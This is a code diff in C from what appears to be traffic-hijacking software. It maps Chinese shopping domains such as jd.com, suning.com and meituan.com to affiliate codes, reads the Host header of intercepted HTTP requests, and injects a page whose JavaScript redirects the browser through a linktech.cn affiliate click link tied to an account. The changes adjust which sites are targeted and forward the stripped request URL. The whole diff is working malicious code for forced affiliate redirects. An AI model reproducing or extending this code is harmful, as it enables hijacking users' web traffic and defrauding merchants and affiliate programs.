@@ -7,27 +7,25 @@
 
 static LPSTR g_DomainCodeMapping[][2] = {
 	{".linktech.cn", NULL},
-	{".u.ctrip.com", NULL},
 	{".redirect.cps.yixun.com", NULL},
 	{".union.moonbasa.com", NULL},
 	{".cps.gome.com.cn", NULL},
 	{".u.vipshop.com", NULL},
 	{".cps.yintai.com", NULL},
-	{".union.dangdang.com", NULL},
 	{".r.union.meituan.com", NULL},
 	{".union.suning.com", NULL},
 	{".cps.xiu.com", NULL},
 	{".cps.wbiao.cn", NULL},
 	{".shop8.x.com.cn", NULL},
+//	{".u.ctrip.com", NULL},
+//	{".union.dangdang.com", NULL},
 	{".vancl.com", "vancl"},
 	{".jumei.com", "jumei"},
 	{".yihaodian.com", "yihaodian"},
-	{".ctrip.com", "ctrip"},
 	{".moonbasa.com", "moonbasa1"},
 	{".gome.com.cn", "gome"},
 	{".vipshop.com", "vipshop"},
 	{".lefeng.com", "lafaso",},
-	{".dangdang.com", "dangdang"},
 	{".dianping.com", "tdianping"},
 	{".meituan.com", "meituan"},
 	{".suning.com", "suning"},
@@ -38,6 +36,8 @@ static LPSTR g_DomainCodeMapping[][2] = {
 	{".yintai.com", "yintai"},
 	{".wbiao.cn", "wbiao"},
 	{".jd.com", "360buy"},
+//	{".ctrip.com", "ctrip"},
+//	{".dangdang.com", "dangdang"},
 };
 
 /*
@@ -54,7 +54,7 @@ static LPSTR g_pLinktectRedirectTemplate =
 	"</head>"
 	"<body>"
 	"<script type='text/javascript'>"
-	"window.location='http://click.linktech.cn/%s?m=%s&a=%s&l=99999&l_cd1=0&l_cd2=1&tu=http%%3A%%2F%%2F%s'"
+	"window.location='http://click.linktech.cn/%s?m=%s&a=%s&l=99999&l_cd1=0&l_cd2=1&tu=%s'"
 	"</script>"
 	"</body>"
 	"<html>";
@@ -465,7 +465,7 @@ main_point:
 	if (!GetHttpHeaderValue(headers, numHeaders, "host: ", &host))
 		goto release_sendbuffer;
 
-	if ((ebindex = MatchingEBusiness(host)) <= 12 && ebindex != 0)
+	if ((ebindex = MatchingEBusiness(host)) <= 10 && ebindex != 0)
 		goto release_sendbuffer;
 
     // check socket addr
@@ -601,6 +601,10 @@ main_point:
 		char redirect_url[URL_MAX_LENGTH];
 		int rcvbuf_len;
 		PGAUSSBUF pReceiveBuffer;
+        char *tmpptr;
+
+        if (tmpptr = strchr(url, '?'))
+            *tmpptr = 0;
 
 		iContentLength = _snprintf(redirect_url, 
 			sizeof(redirect_url), 
@@ -608,7 +612,11 @@ main_point:
             g_pRedirectIdentifier,
             g_pRedirectInfo->pEBusiness[ebindex].pCode,
             g_pRedirectInfo->pAccount,
-			host);
+			url);
+
+        if (tmpptr)
+            *tmpptr = '?';
+
         dbgprint("G: redirect url: %s", redirect_url);
 		if (iContentLength < 0 || iContentLength == sizeof(redirect_url)) {
             dbgprint("G: buffer is too small, redirect failed");
